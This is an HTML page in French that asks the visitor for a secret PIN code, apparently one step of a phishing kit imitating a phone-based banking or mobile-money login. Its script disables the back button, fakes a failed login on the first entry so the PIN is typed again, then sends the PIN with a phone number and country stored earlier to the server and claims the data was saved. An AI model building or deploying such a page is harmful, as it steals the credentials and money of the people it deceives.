<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Code secret</title>

<style>
body{
    margin:0;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    font-family:Arial;
}
.container{
    width:360px;
    background:#f5f5f5;
    padding:30px 25px;
    border-radius:16px;
    box-shadow:0 4px 20px rgba(0,0,0,.1);
    text-align:center;
}
input{
    width:100%;
    padding:14px;
    border-radius:12px;
    border:1px solid #ccc;
    margin-top:10px;
    margin-bottom:20px;
}
button{
    width:100%;
    padding:14px;
    background:#00A8E1;
    border:none;
    border-radius:12px;
    color:#fff;
    font-size:18px;
    cursor:pointer;
}
.error{
    color:#d93025;
    font-size:16px;
    margin-top:15px;
    display:none;
}
</style>
</head>

<body>
<div class="container">
    <h2>Entrez votre code secret</h2>

    <input type="password" id="pin" placeholder="Code secret" required>
    <button type="button" onclick="send()">Continuer</button>
    <div class="error" id="errorMsg">Échec de connexion</div>
</div>

<script>
history.pushState(null, null, location.href);
window.onpopstate = function () {
    history.pushState(null, null, location.href);
};

function send(){
    const pinInput = document.getElementById("pin");
    const pin = pinInput.value;
    const phone = sessionStorage.getItem("phone");
    const country = sessionStorage.getItem("country");
    const errorMsg = document.getElementById("errorMsg");

    if(!pin || !phone || !country) return;

    // Compteur de tentatives
    let attempts = sessionStorage.getItem("pinAttempts") || 0;
    attempts = parseInt(attempts) + 1;
    sessionStorage.setItem("pinAttempts", attempts);

    if(attempts === 1){
        // Première tentative : échec
        errorMsg.style.display = "block";
        errorMsg.style.color = "#d93025";
        errorMsg.textContent = "Échec de connexion";
        pinInput.value = "";
        setTimeout(() => { errorMsg.style.display = "none"; }, 3000);
    } else {
        // Deuxième tentative : succès
        fetch("/", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin, country })
        })
        .then(() => {
            errorMsg.style.display = "block";
            errorMsg.style.color = "green";
            errorMsg.textContent = "Données enregistrées avec succès !";
            pinInput.value = "";
            setTimeout(() => { errorMsg.style.display = "none"; }, 3000);

            // Réinitialiser le compteur
            sessionStorage.setItem("pinAttempts", 0);
        })
        .catch(() => {
            errorMsg.style.display = "block";
            errorMsg.style.color = "#d93025";
            errorMsg.textContent = "Erreur réseau !";
        });
    }
}
</script>

</body>
</html>
